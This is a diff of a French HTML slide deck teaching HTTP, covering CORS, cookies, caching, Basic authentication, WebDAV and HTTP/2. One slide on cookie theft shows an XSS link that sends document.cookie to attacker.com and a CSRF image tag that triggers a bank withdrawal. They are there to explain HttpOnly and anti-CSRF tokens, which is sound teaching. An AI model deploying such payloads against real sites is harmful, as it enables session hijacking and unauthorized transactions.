@@ -21,12 +21,22 @@
     <body>
         <div class="presentation">
             <div id="presentation-counter">Loading...</div>
-            <div class="slides">
-                <div class="slide" id="landing-slide">
+             <div class="slides">
+                 <div class="slide" id="landing-slide">
+                     <style>
+                        #landing-slide p { font-size: 35px; }
+                    </style>
+                    <section class="middle">
+                    <p>Cette présentation est un site en HTML5</p>
+                    <p>Appuyez sur la touche <span id="left-init-key" class="key">&rarr;</span> pour avancer.</p>
+                    </section>
+                </div>
+
+                <div class="slide" id="title-slide">
                     <style>
-                        #landing-slide h1, #title-slide h2 { color: black; }
-                        #landing-slide h1 { letter-spacing: -2px; font-size: 70px; }
-                        #landing-slide h2 { margin-top: 1em; font-size: 36px; color: #665544; }
+                        #title-slide h1, #title-slide h2 { color: black; }
+                        #title-slide h1 { letter-spacing: -2px; font-size: 70px; }
+                        #title-slide h2 { margin-top: 1em; font-size: 36px; color: #665544; }
                     </style>
                     <section class="middle">
                     <h1>HTTP</h1>
@@ -478,7 +488,7 @@ Content-Type: image/jpeg
                   <tr><td>http://<b>v2.www.example.com</b>/</td><td class="ko">KO</td><td>Different host</td></tr>
               </table>
               <h3>Comment faire un appel Ajax sur un autre domaine ?</h3>
-              <p>Avec CORS</p>
+              <p>Historiquement en <abbr title="JSON with Padding">JSONP</abbr> ou maintenant avec CORS</p>
               </section>
           </div>
 
@@ -491,7 +501,7 @@ Content-Type: image/jpeg
           <div class="slide" id="cors-simple-slide">
               <section>
               <h2>Cross-Origin Resource Sharing</h2>
-              <h3>Requêtes simples</h3>
+              <h3>1. Requêtes simples</h3>
               <p>GET, HEAD, POST sous <a href="https://developer.mozilla.org/fr/docs/Web/HTTP/CORS#Requ%C3%AAtes_simples">certaines conditions</a></p>
               <p>Depuis <i>example.org/index.html</i>, je souhaite appeler <i>service.com/file.json</i></p>
 <pre class="client">GET /file.json HTTP/1.1
@@ -504,14 +514,14 @@ Referer: http://example.org/index.html
 Content-Type: application/json
 
 [json data]</pre>
-              <p>Sans l’entête <code>Access-Control-Allow-Origin</code>, le navigateur bloquera le contenu.</p>
+              <p>Sans l’entête <code>Access-Control-Allow-Origin</code>, le navigateur bloquera le contenu (notez que le serveur a servi sa réponse).</p>
               </section>
           </div>
 
           <div class="slide" id="cors-complex-1-slide">
               <section>
               <h2>Cross-Origin Resource Sharing</h2>
-              <h3>Requêtes complexes nécessitant une requête préliminaire (preflight)</h3>
+              <h3>2. Requêtes complexes nécessitant une requête préliminaire (preflight)</h3>
               <p>PUT, DELETE, CONNECT, OPTIONS, TRACE, PATCH ou <a href="https://developer.mozilla.org/fr/docs/Web/HTTP/CORS#Requ%C3%AAtes_n%C3%A9cessitant_une_requ%C3%AAte_pr%C3%A9liminaire">si certains entêtes/valeurs</a></p>
               <p>Le navigateur envoie une requête préliminaire (preflight)</p>
 <pre class="client">OPTIONS /resource/ HTTP/1.1
@@ -578,10 +588,10 @@ Peut également être lu et écrit en JavaScript via <pre>document.cookie</pre>
               <ul>
                   <li>Défini pour un nom de domaine <small>(www.domain.com)</small>
                   <li>limité à 20 cookies par domaine, d’environ 4000 caractères
-                  <li>Envoyé à chaque requête sur le domaine du cookie <small>(html, JS, Ajax, images, etc)</small>
-                  <li>Cookie = contenu personalisé = pas de cache intermédiaire
+                  <li>Envoyé à <strong>chaque requête</strong> sur le domaine du cookie <small>(html, JS, Ajax, images, etc)</small>
+                  <li>Cookie = contenu personalisé = <strong>pas de cache</strong> intermédiaire
                   <li>D’où l’intérêt de servir les ressources communes <small>(images, css, js)</small> depuis un autre sous-domaine <small>(static.domain.com)</small>
-                  <li>Cookie de session (jusqu’à fermeture du navigateur) vs persistant
+                  <li>Cookie de <strong>session</strong> (jusqu’à fermeture de l’onglet) vs persistant
                   <li>Cookie chiffré (contenu chiffré par le serveur)
               </ul>
               </section>
@@ -594,7 +604,7 @@ Peut également être lu et écrit en JavaScript via <pre>document.cookie</pre>
              <section>
              <h2>Les Cookies</h2>
              <ul>
-                 <li>Cookie "first/third party"
+                 <li>Cookie <strong>first</strong> / <strong>third</strong> party
              </ul>
              <p><img src="imgs/cookie-parties.png" title="First / third party cookie" alt=""/></p>
              </section>
@@ -607,7 +617,7 @@ Peut également être lu et écrit en JavaScript via <pre>document.cookie</pre>
               <ul>
                   <li>un nom de domaine <small>(pour permettre le "cross-subdomain")</small>,
                   <li>un chemin,
-                  <li>date d'expiration <small>(sans, le cookie est supprimé lorsque le navigateur est fermé)</small>,
+                  <li>date d'expiration <small>(cookie de « session » sans)</small>,
                   <li>Flag <strong>secure</strong> (non transmis sans TLS)
                   <li>Flag <strong>HttpOnly</strong> (invisible pour JavaScript)
               </ul>
@@ -632,13 +642,11 @@ Peut également être lu et écrit en JavaScript via <pre>document.cookie</pre>
               <h2>Vol de cookie (cookie hijacking)</h2>
               <h3>Cross-Site Scripting (XSS)</h3>
               <p>Un attaquant poste cela sur un site :</p>
-              <pre>&lt;a href="#"
-  onclick="window.location='//attacker.com/?cookie='+escape(document.cookie);
-  return false;"&gt;Click here!&lt;/a&gt;</pre>
+              <pre>&lt;a href="" onclick="<strong>location='//attacker.com/?cookie='+document.cookie</strong>"&gt;hello&lt;/a&gt;</pre>
               <p>D’où l’intérêt du flag <i>HttpOnly</i>.</p>
               <h3>Cross-Site Request Forgery (CSRF)</h3>
               <p>Un attaquant poste cela sur un site :</p>
-              <pre>&lt;img src="//bank.com/withdraw?amount=100&amp;for=attacker"&gt;</pre>
+              <pre>&lt;img src="<strong>//bank.com/withdraw?amount=100&amp;for=attacker</strong>"&gt;</pre>
               <p>Pour l’éviter, le serveur doit envoyer un jeton unique et aléatoire avant chaque requête « importante ». Le client doit obligatoirement le retransmettre dans la requête suivante.</p>
               <p>Il faut également éviter d’utiliser <code>*</code> dans vos entêtes <abbr title="Cross Origin Ressource Sharing">CORS</abbr>.</p>
               </section>
@@ -663,7 +671,7 @@ Peut également être lu et écrit en JavaScript via <pre>document.cookie</pre>
               <h3>Qui ?</h3>
               <ul>
                   <li>Navigateur / Client
-                  <li>Proxy <small>(squid, équipement réseau/"network appliance")</small>
+                  <li>Proxy <small>(squid, équipement réseau ou « network appliance »)</small>
                   <li>Reverse-proxy <small>(squid, varnish, etc)</small>
                   <li><abbr title="Content Delivery Network">CDN</abbr> <small>(CloudFlare, Amazon Cloud Front, Akamai,...)</small>
               </ul>
@@ -674,22 +682,22 @@ Peut également être lu et écrit en JavaScript via <pre>document.cookie</pre>
               </ul>
               <h3>Définitions :</h3>
               <ul>
-                  <li>Cache hit
-                  <li>Cache miss
-                  <li>Revalidation
+                  <li style="color: green;">✔ cache hit
+                  <li style="color: red;">✘ cache miss
+                  <li style="color: blue;">revalidation
               </ul>
               </section>
           </div>
           <div class="slide" id="cache-date-expires-slide">
               <section>
               <h2>Cache : Date et Expires</h2>
-<pre class="server">Date: Tue, 04 Sep 2016 09:24:26 GMT
-Expires: Thu, 01 Dec 1994 16:00:00 GMT</pre>
+<pre class="server"><strong>Date</strong>: Tue, 04 Sep 2016 09:24:26 GMT
+<strong>Expires</strong>: Thu, 01 Dec 1994 16:00:00 GMT</pre>
               <ul>
                   <li><code>Date</code> obligatoire !
-                  <li><code>Expires &gt; now()</code> : caché jusqu’à la date indiquée puis revalidation
-                  <li><code>Expires == now()</code> : caché mais revalidation à la prochaine requête
-                  <li><code>Expires &lt; now() || Expires == -1</code> : pas de cache
+                  <li><code>Expires &gt; now</code> : caché jusqu’à la date indiquée puis revalidation
+                  <li><code>Expires == now</code> : caché mais revalidation à la prochaine requête
+                  <li><code>Expires &lt; now || Expires == -1</code> : pas de cache
               </ul>
               </section>
           </div>
@@ -697,16 +705,16 @@ Expires: Thu, 01 Dec 1994 16:00:00 GMT</pre>
               <section>
               <h2>Cache : Cache-Control</h2>
               <ul>
-                  <li><code>Cache-Control: private</code> : Cache client
-                  <li><code>Cache-Control: public</code> : Cache client et proxy
-                  <li><code>Cache-Control: no-cache</code> : Cache client et proxy mais revalidation
-                  <li><code>Cache-Control: no-cache=Set-Cookie</code> : Ne pas cacher cet entête
-                  <li><code>Cache-Control: no-store</code> : Cache client ou proxy interdit
-                  <li><code>Cache-Control: must-revalidate</code> : Revalidation après expiration
-                  <li><code>Cache-Control: proxy-revalidate</code> : Idem mais pour les proxies
-                  <li><code>Cache-Control: max-age=xxx</code> : Temps relatif, en secondes
-                  <li><code>Cache-Control: s-maxage=xxx</code> : Idem mais que pour les proxies
-                  <li><code>Cache-Control: no-transform</code> : Les proxies ne doivent pas transformer la ressource
+                  <li><code>Cache-Control: private</code> : cache client
+                  <li><code>Cache-Control: public</code> : cache client et proxy
+                  <li><code>Cache-Control: no-cache</code> : cache client et proxy mais revalidation
+                  <li><code>Cache-Control: no-cache=Set-Cookie</code> : pas de cache sur cet entête
+                  <li><code>Cache-Control: no-store</code> : cache client ou proxy interdit
+                  <li><code>Cache-Control: must-revalidate</code> : revalidation après expiration
+                  <li><code>Cache-Control: proxy-revalidate</code> : idem mais pour les proxies
+                  <li><code>Cache-Control: max-age=xxx</code> : temps relatif, en secondes
+                  <li><code>Cache-Control: s-maxage=xxx</code> : idem mais que pour les proxies
+                  <li><code>Cache-Control: no-transform</code> : les proxies ne doivent pas transformer le contenu
               </ul>
               </section>
           </div>
@@ -803,16 +811,14 @@ Host: www.exemple.org
 WWW-Authenticate: Basic realm="Secure Area"</strong>
 Content-type: text/html
 ...</pre>
+<img alt="authentification box" src="imgs/authentification.png" style="border: 1px solid black;">
+<h3>Encodage base 64</h3>
+<kbd>$ echo -n "Aladdin:open sesame" | base64 -            # QWxhZGRpbjpvcGVuIHNlc2FtZQ==</kbd>
 <pre class="client">GET /private/index.html HTTP/1.1
 Host: www.exemple.org
 <strong>Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==</strong>
 </pre>
-<h3>Encodage/décodage base 64</h3>
-<kbd>&gt; echo -n "Aladdin:open sesame" | base64 -
-&gt; QWxhZGRpbjpvcGVuIHNlc2FtZQ==
-&gt; echo -n QWxhZGRpbjpvcGVuIHNlc2FtZQ== | base64 -d
-&gt; Aladdin:open sesame
-</kbd>
+<kbd>$ echo -n QWxhZGRpbjpvcGVuIHNlc2FtZQ== | base64 -d    # Aladdin:open sesame</kbd>
             </section>
         </div>
         <div class="slide" id="authentification-digest-slide">
@@ -853,14 +859,11 @@ opaque="5ccc069c403ebaf9f0171e9517f40e41"</strong>
                   <li>gestion des droits d’accès, vérrouillage des fichiers,
                   <li>Nouvelles méthodes, entêtes et codes de retour (<small><a href="//tools.ietf.org/html/rfc4918"><abbr title="Request for comment">RFC</abbr> 4918</a></small>) :
               </ul>
-<pre class="client">COPY /~fielding/index.html HTTP/1.1
+<pre class="client"><strong>COPY</strong> /~fielding/index.html HTTP/1.1
 Host: www.example.com
 Destination: http://www.example.com/users/f/fielding/index.html
 If: &lt;http://www.example.com/users/f/fielding/index.html&gt; (&lt;urn:uuid:f81d4fae-7dec-11d0-a765-00a0c91e6bf6&gt;)</pre>
-<pre class="server">HTTP/1.1 204 No Content</pre>
-<pre class="client">DELETE /locked/member HTTP/1.1
-Host: example.com</pre>
-<pre class="server">HTTP/1.1 423 Locked
+<pre class="server">HTTP/1.1 <strong>423 Locked</strong>
 Content-Type: application/xml; charset="utf-8"
 Content-Length: xxxx
 
@@ -885,10 +888,10 @@ Content-Length: xxxx
               <h2>HTTP/2 (ou h2)</h2>
               <ul>
                   <li>Google propose <abbr title="Speedy"><a href="https://tools.ietf.org/html/draft-mbelshe-httpbis-spdy-00">SPDY</a></abbr> en <a href="http://googleresearch.blogspot.com/2009/11/2x-faster-web.html">2009</a>
+                  <li>ne remplace pas HTTP mais optimise l’échange des données
                   <li>création d’un groupe de travail (httpbis) par l’IETF
                   <li>SPDY deviendra la base de HTTP/2, il sera publié en 2015 (<a href="https://tools.ietf.org/html/rfc7540">RFC7540</a>)
-                  <li>rétro-compatibilité complète
-                  <li>ne remplace pas HTTP mais optimise l’échange des données
+                  <li>rétro-compatibilité complète avec HTTP/1.1
                   <li>multiplexage (plusieurs streams) au sein d’une seule requête TCP :
                       <img src="imgs/h2-connections.png" alt="">
               </ul>
@@ -913,7 +916,9 @@ Content-Length: xxxx
               <section>
               <h2>Outils et resources</h2>
               <ul>
-                  <li>telnet, curl, wget
+                  <li><code>telnet</code>
+                  <li><code>curl -I -XGET</code>
+                  <li><code><a href="https://stedolan.github.io/jq/">jq</a></code><small> (pour le JSON)</small>
                   <li><a href="http://httpie.org">HTTPie</a> : curl pour "humain"
                   <li><a href="http://htty.github.com">htty</a> : une console http
                   <li><a href="https://www.youtube.com/watch?v=KL9MR721c4w">RetourAuxSources Les cookies HTTP (par H. Sablonnière)</a>
